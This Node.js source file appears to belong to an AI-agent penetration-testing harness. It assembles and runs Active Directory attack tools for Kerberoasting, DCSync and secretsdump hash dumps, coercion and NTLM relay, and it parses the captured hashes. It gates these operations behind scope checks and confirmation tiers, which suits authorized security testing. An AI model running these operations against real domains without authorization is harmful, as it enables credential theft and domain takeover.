#!/usr/bin/env node
// Cyboros AD — deterministic Active-Directory orchestrator (the AD analog of wifi.js).
//
// Today stavros-ad drives enum4linux-ng / netexec / impacket / certipy as FREEFORM binaries via
// run.js. This tool replaces that with a scope-checked, tier-gated, STRUCTURED-PARSING front end,
// the same discipline the rest of the harness applies to every other class.
//
//   node tools/ad.js check <host>                                 scope verdict (exit 0 = in scope)
//   node tools/ad.js enum <host> [--user u --pass-file f | --null]  users/groups/shares/policy/signing (auto)
//   node tools/ad.js roast <dc> --kerberoast|--asrep --user u --pass-file f [--userlist f]  crackable hashes (auto)
//   node tools/ad.js adcs <dc> --user u --pass-file f              certipy ESC1..ESC16 detection (auto)
//   node tools/ad.js bloodhound <domain> --dc <ip> --user u --pass-file f   collection→ingest (auto)
//   node tools/ad.js dcsync <dc> --user u --pass-file f --confirm "reason"    domain hash dump (CONFIRM)
//   node tools/ad.js secretsdump <host> --user u --pass-file f --confirm "reason"  local/SAM dump (CONFIRM)
//   node tools/ad.js enum-relay <host|cidr> [--user u --pass-file f]        relayability audit (auto)
//   node tools/ad.js enum-coerce <host> [--user u --pass-file f]            coercion-surface audit (auto)
//   node tools/ad.js enum-delegation <dc> --domain d --user u               delegation enum (auto)
//   node tools/ad.js enum-mssql <host> [--user u --pass-file f]             MSSQL impersonation audit (auto)
//   node tools/ad.js coerce <host> --listener <h:p> --confirm "reason"      coercion toward listener (CONFIRM)
//   node tools/ad.js relay <host|cidr> --listener <h:p> [--targets f] --confirm "reason"  ntlmrelayx SOCKS (CONFIRM)
//
// Rules of engagement (mirrors knowledge.md + c2-guard.js):
//   - Every target host/CIDR is scope-checked BEFORE any binary spawns (fail-closed, audited).
//   - Enumeration + roasting + ADCS-find + bloodhound-collect are AUTO tier (read/collection only).
//   - dcsync / secretsdump / relay-adjacent = CONFIRM tier: refused without --confirm "<reason>"
//     AND explicit in-session user approval. Unknown ops fail closed to CONFIRM.
//   - Passwords are read from a FILE (--pass-file), never argv (mirrors sshx.js): they never hit
//     the process table or the audit log.
//   - Cracked/looted hashes are RETURNED to the caller (with a fingerprint) so it records them via
//     record-finding.js '{"secret":...}' into the gitignored loot vault, then crack.js consumes them.
//
// ponytail: netexec/enum4linux/impacket/certipy output is human text; the parsers below are
// best-effort regex extractors, not a stable machine format. Every hit is a LEAD — verify on the
// box and record honestly per the verify_level discipline. No exploit code lives in this repo.
'use strict';
const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');
const sg = require('./scope-guard');
const run = require('./run');

// Binary presence probe for command-assembly fallbacks (which(1), come tool-plane.hasBin).
function commandExists(bin) {
  try { return spawnSync('/usr/bin/which', [bin], { stdio: 'ignore' }).status === 0; } catch { return false; }
}

const AUDIT_FILE = () =>
  process.env.RUN_AUDIT_FILE || path.join(__dirname, '..', 'reports', 'tmp', 'run-audit.jsonl');
const OUT_DIR = () =>
  process.env.STAVROS_AD_DIR || path.join(__dirname, '..', 'reports', 'ad');
const SCOPE_PATH = () =>
  process.env.SCOPE_JSON || path.join(__dirname, '..', 'scope.json');

function audit(entry) {
  try {
    const p = AUDIT_FILE();
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.appendFileSync(p, JSON.stringify(Object.assign({ ts: new Date().toISOString(), tool: 'ad' }, entry)) + '\n');
  } catch { /* audit is best-effort; never block on it */ }
}

function loadScope() {
  try { return sg.normalizeScope(JSON.parse(fs.readFileSync(SCOPE_PATH(), 'utf8'))); }
  catch { return sg.normalizeScope({}); }
}

// ---- tier model: op -> action class -> tier ---------------------------------
// AUTO = read/collection (safe by default). CONFIRM = domain-wide credential dump / relay.
const OP_TIER = {
  check: 'auto',
  enum: 'auto',
  roast: 'auto',        // requesting TGS/AS-REP hashes is read-only against the DC
  adcs: 'auto',         // certipy find is enumeration
  bloodhound: 'auto',   // collection only
  dcsync: 'confirm',    // pulls every domain hash — high impact
  secretsdump: 'confirm',
  relay: 'confirm',
  'enum-relay': 'auto',      // relayability AUDIT (signing check): banners only, targets untouched
  'enum-coerce': 'auto',     // coercion-surface fingerprint: netexec read-only modules, NO coercion sent
  'enum-delegation': 'auto', // findDelegation enumeration (read-only)
  'enum-mssql': 'auto',      // MSSQL logins/dbs + impersonation audit (read-only)
  coerce: 'confirm',       // forces machine authentications toward a listener — high impact
};

function classify(op) {
  const tier = OP_TIER[op];
  // Unknown op fails closed to confirm (defense in depth with the generic guard).
  return { actionClass: op, tier: tier || 'confirm' };
}

function enforce(op, opts) {
  const { tier, actionClass } = classify(op);
  if (tier === 'auto') return { ok: true, tier, actionClass };
  if (opts && opts.confirm && String(opts.confirm).trim())
    return { ok: true, tier, actionClass, confirmed: true };
  return {
    ok: false, tier, actionClass,
    reason: `AD op '${op}' is confirm-tier: pass --confirm "<reason>" (requires explicit in-session user approval)`,
  };
}

// ---- scope: a target host/CIDR must be in scope BEFORE any binary spawns -----
function scopeCheck(target, scope) {
  scope = scope || loadScope();
  const t = String(target || '').trim();
  if (!t) return { ok: false, reason: 'empty target' };
  const verdict = run.isCidr(t) ? sg.cidrInScope(t, scope) : sg.inScope(t, scope);
  return { ok: !!verdict.ok, reason: verdict.reason, target: t };
}

// ============================================================================
// Deterministic parsers (netexec / enum4linux-ng / certipy / impacket)
// ============================================================================

// netexec/crackmapexec SMB banner line ->
//   SMB  10.0.0.1  445  DC01  [*] Windows Server 2019 Build 17763 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
function parseNxcSmbBanner(text) {
  const hosts = [];
  for (const line of String(text || '').split('\n')) {
    const m = line.match(/SMB\s+(\S+)\s+(\d+)\s+(\S+)\s+\[\*\]\s+(.*)/);
    if (!m) continue;
    const [, ip, port, netbios, rest] = m;
    const g = (re) => (rest.match(re) || [])[1];
    hosts.push({
      ip, port: Number(port), netbios,
      os: (rest.split('(')[0] || '').trim(),
      domain: g(/\(domain:([^)]+)\)/i) || null,
      signing: /\(signing:True\)/i.test(rest) ? true : /\(signing:False\)/i.test(rest) ? false : null,
      smbv1: /\(SMBv1:True\)/i.test(rest) ? true : /\(SMBv1:False\)/i.test(rest) ? false : null,
    });
  }
  return hosts;
}

// netexec --shares -> Share / Permissions rows.
function parseNxcShares(text) {
  const shares = [];
  for (const line of String(text || '').split('\n')) {
    // SMB  host  445  DC01  Share  Permissions  Remark   (header) then data rows
    const m = line.match(/SMB\s+\S+\s+\d+\s+\S+\s+(\S.*?)\s{2,}(READ|WRITE|READ,WRITE|)\s*(.*)$/);
    if (!m) continue;
    const name = m[1].trim();
    if (!name || /^Share$/i.test(name)) continue; // skip header
    shares.push({ name, perms: (m[2] || '').trim() || null, remark: (m[3] || '').trim() || null });
  }
  return shares;
}

// certipy find -stdout -> vulnerable templates with their ESC ids.
function parseCertipy(text) {
  const t = String(text || '');
  const vulns = [];
  // certipy prints "[!] Vulnerabilities" then "ESC1 : '<detail>'" lines under a template block.
  const escRe = /\bESC(\d{1,2})\b[^\n]*/g;
  let m;
  const seen = new Set();
  while ((m = escRe.exec(t))) {
    const id = `ESC${m[1]}`;
    const detail = m[0].replace(/^.*?ESC\d{1,2}\s*[:=-]?\s*/, '').trim();
    const key = id + '|' + detail.slice(0, 60);
    if (seen.has(key)) continue;
    seen.add(key);
    vulns.push({ esc: id, detail: detail || null });
  }
  // Template names (best-effort): "Template Name  : X" preceding a vuln block.
  const templates = [...t.matchAll(/Template Name\s*:\s*(\S+)/gi)].map((x) => x[1]);
  return { vulns, templates };
}

// impacket GetUserSPNs -request  ->  $krb5tgs$... hashes (Kerberoasting)
// impacket GetNPUsers            ->  $krb5asrep$... hashes (AS-REP roasting)
function parseKerbHashes(text) {
  const hashes = [];
  const re = /\$krb5(tgs|asrep)\$[^\s]+/gi;
  let m;
  while ((m = re.exec(String(text || '')))) {
    const kind = m[1].toLowerCase() === 'tgs' ? 'kerberoast' : 'asrep';
    // hashcat mode: 13100 (TGS-REP) / 18200 (AS-REP)
    hashes.push({ kind, hashcat_mode: kind === 'kerberoast' ? 13100 : 18200, hash: m[0] });
  }
  return hashes;
}

// netexec coercion-fingerprint modules (-M spooler-target/petitpotam/dfss) → per-host verdicts.
// These modules ONLY probe whether the spooler/EFS/DFSNM endpoints answer — they never trigger an
// authentication toward a listener, which is why the whole op stays auto-tier.
// Line shape (best-effort): SMB  10.0.0.5  445  DC01  [+] spooler-target: vulnerable
function parseCoerceModules(text) {
  const out = [];
  for (const line of String(text || '').split('\n')) {
    const m = line.match(/SMB\s+(\S+)\s+\d+\s+\S+\s+(?:\[.\]\s*)?(spooler-target|petitpotam|dfss)\s*:?\s*(.*)/i);
    if (!m) continue;
    const [, host, mod, rest] = m;
    const machine = mod.toLowerCase() === 'spooler-target' ? 'spoolsv' : mod.toLowerCase() === 'petitpotam' ? 'efs' : 'dfsnm';
    const vulnerable = /\[\+\]/.test(line) && !/not\s+vulnerable/i.test(rest);
    out.push({ host, machine, vulnerable, detail: rest.trim() || null });
  }
  return out;
}

// impacket-findDelegation best-effort parser. Output differs across impacket versions (per-account
// blocks vs table rows), so we extract by keyword: an "Account" line opens a block, the next line
// naming a delegation type closes it. Every hit is a LEAD — verify on the DC before reporting.
function parseFindDelegation(text) {
  const out = [];
  let current = null;
  for (const rawLine of String(text || '').split('\n')) {
    const line = rawLine.trim();
    if (!line) continue;
    const am = line.match(/Account(?:\s+Name)?\s*[:=]\s*([^\s(]+)/i);
    if (am) current = am[1];
    const t = line.toLowerCase();
    let type = null;
    if (/unconstrained/.test(t)) type = 'unconstrained';
    else if (/resource-based|\brbcd\b/.test(t)) type = 'rbcd';
    else if (/constrained/.test(t)) type = 'constrained';
    if (type && current) {
      out.push({ account: current, type, protocol_transition: /protocol transition/.test(t) });
      current = null; // one record per delegation line
    }
  }
  return out;
}

// netexec mssql --users --db (+ mssql_priv module) → impersonation audit (read-only).
// "can impersonate" rows are the P0.5 handoff: the CHAIN (chain.js) proposes the relay step,
// the execution stays confirm-tier (P0.3). Best-effort on netexec text output.
function parseMssqlAudit(text) {
  const t = String(text || '');
  const dbs = [...t.matchAll(/catalog:\s*(\S+)/gi)].map((m) => m[1]);
  const impersonatable = [];
  for (const line of t.split('\n')) {
    const m = line.match(/User\s+'([^']+)'\s+can\s+impersonate:\s*'([^']+)'/i) ||
              line.match(/\bIMPERSONATE\b[:\s]+(\S+)/i);
    if (m) impersonatable.push({ user: m[1], as: m[2] || null });
  }
  return { dbs, impersonatable };
}

// enum4linux-ng / rpcclient password policy (best-effort).
function parsePolicy(text) {
  const t = String(text || '');
  const num = (re) => { const x = t.match(re); return x ? Number(x[1]) : null; };
  return {
    min_password_length: num(/Minimum password length\s*[:=]\s*(\d+)/i),
    lockout_threshold: num(/(?:Account )?[Ll]ockout threshold\s*[:=]\s*(\d+)/i),
    lockout_duration: num(/[Ll]ockout duration.*?[:=]\s*(\d+)/i),
    max_password_age: num(/Maximum password age\s*[:=]\s*(\d+)/i),
  };
}

// ============================================================================
// Command assembly (bin + args per op). Pure functions → unit-testable offline.
// ============================================================================
function buildArgs(op, target, opts) {
  opts = opts || {};
  const cred = [];
  if (opts.user) cred.push('-u', opts.user);
  switch (op) {
    case 'enum': {
      // netexec smb <host> --users --groups --shares --pass-pol  (auth or --null)
      const a = ['smb', target];
      if (opts.user) { a.push('-u', opts.user); a.push('-p', opts.passRef || ''); }
      if (opts.null) { a.push('-u', '', '-p', ''); }
      a.push('--users', '--groups', '--shares', '--pass-pol');
      return { bin: 'netexec', args: a };
    }
    case 'roast': {
      // impacket GetUserSPNs (kerberoast) or GetNPUsers (asrep)
      if (opts.asrep) {
        const a = [`${opts.domain || ''}/`, '-dc-ip', target, '-request', '-format', 'hashcat', '-no-pass'];
        if (opts.userlist) a.push('-usersfile', opts.userlist);
        return { bin: 'impacket-GetNPUsers', args: a };
      }
      const a = [`${opts.domain || ''}/${opts.user || ''}`, '-dc-ip', target, '-request'];
      return { bin: 'impacket-GetUserSPNs', args: a };
    }
    case 'adcs':
      return { bin: 'certipy', args: ['find', '-u', `${opts.user || ''}@${opts.domain || ''}`, '-dc-ip', target, '-vulnerable', '-stdout'] };
    case 'bloodhound':
      return { bin: 'bloodhound-python', args: ['-d', target, '-u', opts.user || '', '-ns', opts.dc || '', '-c', 'All', '--zip'] };
    case 'dcsync':
      return { bin: 'impacket-secretsdump', args: [`${opts.domain || ''}/${opts.user || ''}@${target}`, '-just-dc'] };
    case 'secretsdump':
      return { bin: 'impacket-secretsdump', args: [`${opts.domain || ''}/${opts.user || ''}@${target}`] };
    case 'enum-relay': {
      // netexec --gen-relay-list = null/guest auth + per-host signing check. Output txt feeds
      // the confirm-tier relay step; the structured map lands in reports/ad/relay-map-<ts>.json.
      const a = ['smb', target];
      if (opts.user) { a.push('-u', opts.user); a.push('-p', opts.passRef || ''); }
      else a.push('-u', '', '-p', '');
      a.push('--gen-relay-list', opts.relayListOut || path.join('reports', 'ad', 'relay-list.txt'));
      return { bin: 'netexec', args: a };
    }
    case 'enum-coerce':
      // Fingerprinting modules ONLY (spooler/efs/dfsnm presence): read-only, no coercion sent.
      return { bin: 'netexec', args: ['smb', target,
        ...(opts.user ? ['-u', opts.user, '-p', opts.passRef || ''] : ['-u', '', '-p', '']),
        '-M', 'spooler-target', '-M', 'petitpotam', '-M', 'dfss'] };
    case 'enum-delegation':
      // impacket prompts for the password when needed (same pattern as dcsync above).
      return { bin: 'impacket-findDelegation', args: [`${opts.domain || ''}/${opts.user || ''}@${target}`, '-dc-ip', target] };
    case 'enum-mssql':
      return { bin: 'netexec', args: ['mssql', target,
        ...(opts.user ? ['-u', opts.user, '-p', opts.passRef || ''] : ['-u', '', '-p', '']),
        '--users', '--db'] };
    case 'coerce': {
      // Coercion TOWARD opts.listener (host:port). `impacket-dfscoerce` NON esiste in upstream
      // impacket (verificato su 0.13.1: nessuno script dfscoerce fra gli apps pipx): si usa solo
      // se un build operator-supplied lo fornisce; altrimenti Coercer (pipx, @podalirius_) copre
      // le stesse vettoriali MS-DFSNM/MS-EFSR. Coercer usa il solo IP del listener: la vittima
      // richiama su porte servizio standard, quindi avviare ntlmrelayx di conseguenza.
      if (!opts.listener) return null; // the runAd gate refuses with stage 'listener'
      const has = typeof opts.which === 'function' ? opts.which : commandExists;
      const lip = String(opts.listener).split(':')[0];
      if (has('impacket-dfscoerce'))
        return { bin: 'impacket-dfscoerce', args: ['-d', opts.domain || '', '-u', opts.user || '', opts.listener, target] };
      if (has('coercer'))
        return { bin: 'coercer', args: ['coerce', '-t', target, '-l', lip,
          ...(opts.domain ? ['-d', opts.domain] : []),
          ...(opts.user ? ['-u', opts.user, '-p', opts.passRef || ''] : ['--no-pass']),
          '--always-continue'] };
      return null; // nessun coercer installato: fail-closed, build refusata
    }
    case 'relay':
      // ntlmrelayx SOCKS-only mode: passive auth collection. NO dump/write flags are ever
      // assembled here — dcsync/secretsdump remain separate confirm-tier ops. The target
      // list is the enum-relay output (--gen-relay-list txt). runAd additionally demands
      // a registered listener session (stage 'listener').
      if (!opts.listener) return null;
      return { bin: 'impacket-ntlmrelayx', args: [
        '-tf', opts.targets || path.join('reports', 'ad', 'relay-list.txt'),
        '-smb2support', '-socks',
        ...(opts.httpPort ? ['--http-port', String(opts.httpPort)] : [])] };
    default:
      return null;
  }
}

// ============================================================================
// Orchestration. opts.runAd(bin,args,ctx) is injectable for offline tests; on real
// runs it defaults to scope-check + tier-check + audit + run.runBinary.
// ============================================================================
// ---- sessions ledger (teardown): listeners + relay SOCKS sessions --------------------------
const SESSIONS_JSON = () => process.env.SESSIONS_JSON || path.join(__dirname, '..', 'reports', 'sessions.json');
function loadSessions() {
  try { return JSON.parse(fs.readFileSync(SESSIONS_JSON(), 'utf8')); } catch { return { sessions: {} }; }
}
function findListenerSession(reg, listener) {
  if (!listener || !reg || !reg.sessions) return null;
  const norm = String(listener).toLowerCase().replace(/\/+$/, '');
  return Object.entries(reg.sessions).find(([, s]) => {
    if (!s || s.status === 'closed') return false;
    return [s.host, s.endpoint, s.listener, s.target].some((v) => String(v || '').toLowerCase().includes(norm));
  }) || null;
}

async function runAd(op, target, opts) {
  opts = opts || {};
  const scope = opts.scope || loadScope();

  const sc = scopeCheck(target, scope);
  if (!sc.ok) { audit({ op, target, verdict: 'out-of-scope', reason: sc.reason }); return { ok: false, stage: 'scope', reason: sc.reason }; }

  const tier = enforce(op, opts);
  if (!tier.ok) { audit({ op, target, verdict: 'tier-refused', tier: tier.tier }); return { ok: false, stage: 'tier', reason: tier.reason, tier: tier.tier }; }

  // P0.3 anti-spray gate: coerce/relay need opts.listener AND a REGISTERED listener session
  // in the sessions ledger. A confirm flag alone does not prove a listener is actually up.
  if (op === 'coerce' || op === 'relay') {
    if (!opts.listener) {
      audit({ op, target, verdict: 'refused', reason: 'no --listener' });
      return { ok: false, stage: 'listener', reason: `op '${op}' requires --listener <host:port> and a listener registered in the sessions ledger (anti-spray gate)` };
    }
    const entry = findListenerSession(loadSessions(), opts.listener);
    if (!entry) {
      audit({ op, target, verdict: 'refused', reason: `listener ${opts.listener} not registered` });
      return { ok: false, stage: 'listener', reason: `listener ${opts.listener} is not registered in the sessions ledger (start it and register it first; see docs/host-exploitation.md "NTLM relay & coercion")` };
    }
  }

  const built = buildArgs(op, target, opts);
  if (!built) return { ok: false, stage: 'build', reason: `unknown op '${op}'` };

  audit({ op, target, tier: tier.tier, confirmed: !!tier.confirmed, bin: built.bin });

  // Password is passed to the binary from a FILE, resolved here (never on the audit line).
  let passValue = null;
  if (opts.passFile) { try { passValue = fs.readFileSync(opts.passFile, 'utf8').trim(); } catch { return { ok: false, stage: 'creds', reason: `cannot read --pass-file ${opts.passFile}` }; } }
  const finalArgs = built.args.map((a) => (a === '' && passValue && op !== 'enum' ? passValue : a));
  if (op === 'enum' && passValue) { const i = finalArgs.indexOf(''); if (i >= 0) finalArgs[i] = passValue; }

  const runner = opts.runAd || ((bin, args, ctx) => run.runBinary(bin, args, Object.assign({ capture: true, timeoutMs: 180000 }, ctx)));
  const res = await runner(built.bin, finalArgs, { op, tier: tier.tier });
  const text = String((res && (res.stdout || res.output)) || '') + '\n' + String((res && res.stderr) || '');

  // Parse per op.
  const parsed = {};
  if (op === 'enum') { parsed.hosts = parseNxcSmbBanner(text); parsed.shares = parseNxcShares(text); parsed.policy = parsePolicy(text); }
  if (op === 'adcs') { Object.assign(parsed, parseCertipy(text)); }
  if (op === 'roast' || op === 'dcsync' || op === 'secretsdump') { parsed.hashes = parseKerbHashes(text); }
  if (op === 'enum-relay') { parsed.hosts = parseNxcSmbBanner(text); parsed.relay_targets = parsed.hosts.filter((h) => h.signing === false); }
  if (op === 'enum-coerce') { parsed.coerce_targets = parseCoerceModules(text); }
  if (op === 'enum-delegation') { parsed.delegations = parseFindDelegation(text); }
  if (op === 'enum-mssql') { Object.assign(parsed, parseMssqlAudit(text)); }

  // Persist transcript.
  try {
    const dir = OUT_DIR();
    fs.mkdirSync(dir, { recursive: true });
    const f = path.join(dir, `${op}-${String(target).replace(/[^a-z0-9_.@-]/gi, '_')}-${Date.now()}.txt`);
    fs.writeFileSync(f, text);
    parsed._transcript = f;
  } catch { /* non-fatal */ }

  // Structured relay map for the confirm-tier relay step (audit record; ntlmrelayx itself
  // consumes the --gen-relay-list txt written by netexec).
  if (op === 'enum-relay' && parsed.relay_targets) {
    try {
      const dir = OUT_DIR();
      fs.mkdirSync(dir, { recursive: true });
      const jf = path.join(dir, `relay-map-${Date.now()}.json`);
      fs.writeFileSync(jf, JSON.stringify({ generated_at: new Date().toISOString(), target, relay_targets: parsed.relay_targets, hosts: parsed.hosts }, null, 2));
      parsed._relay_map = jf;
    } catch { /* non-fatal */ }
  }

  // Every SOCKS auth-collection session enters the teardown ledger so engagement close-out
  // (tools/sessions.js) covers the relay sockets too. Best-effort: never blocks the result.
  if (op === 'relay' && res && (res.status === 0 || res.status === undefined)) {
    try {
      require('./sessions').upsertSession({
        id: `relay-${String(target).replace(/[^a-z0-9_.-]/gi, '_')}-${Date.now()}`,
        type: 'ntlmrelayx-socks', status: 'open', host: opts.listener, target,
        ts: new Date().toISOString(), note: 'SOCKS auth collection; teardown via tools/sessions.js on engagement close',
      });
    } catch { /* ledger best-effort */ }
  }

  return { ok: (res && (res.status === 0 || res.status === undefined)) || !!parsed.hosts, op, target, tier: tier.tier, status: res && res.status, parsed };
}

module.exports = {
  classify, enforce, scopeCheck, buildArgs, runAd, loadScope,
  parseNxcSmbBanner, parseNxcShares, parseCertipy, parseKerbHashes, parsePolicy,
  parseCoerceModules, parseFindDelegation, parseMssqlAudit, findListenerSession, loadSessions,
  OP_TIER,
};

// ---- CLI --------------------------------------------------------------------
function parseCli(argv) {
  const o = { _: [] };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === '--kerberoast') o.kerberoast = true;
    else if (a === '--asrep') o.asrep = true;
    else if (a === '--null') o.null = true;
    else if (a === '--user') o.user = argv[++i];
    else if (a === '--pass-file') o.passFile = argv[++i];
    else if (a === '--userlist') o.userlist = argv[++i];
    else if (a === '--domain') o.domain = argv[++i];
    else if (a === '--dc') o.dc = argv[++i];
    else if (a === '--confirm') o.confirm = argv[++i];
    else if (a.startsWith('--')) o[a.slice(2)] = argv[++i];
    else o._.push(a);
  }
  return o;
}

async function main() {
  const [op, target] = process.argv.slice(2);
  const opts = parseCli(process.argv.slice(4));
  if (!op) {
    console.error('usage: node tools/ad.js <check|enum|roast|adcs|bloodhound|enum-relay|enum-coerce|enum-delegation|enum-mssql|dcsync|secretsdump|coerce|relay> <host> [opts]');
    process.exit(2);
  }
  if (op === 'check') {
    const sc = scopeCheck(target);
    console.log(sc.ok ? `IN SCOPE: ${target}` : `OUT OF SCOPE: ${target} (${sc.reason || 'not allowed'})`);
    process.exit(sc.ok ? 0 : 1);
  }
  const res = await runAd(op, target, opts);
  console.log(JSON.stringify(res, null, 2));
  process.exit(res.ok ? 0 : 1);
}

if (require.main === module) main().catch((e) => { console.error(e.message); process.exit(1); });
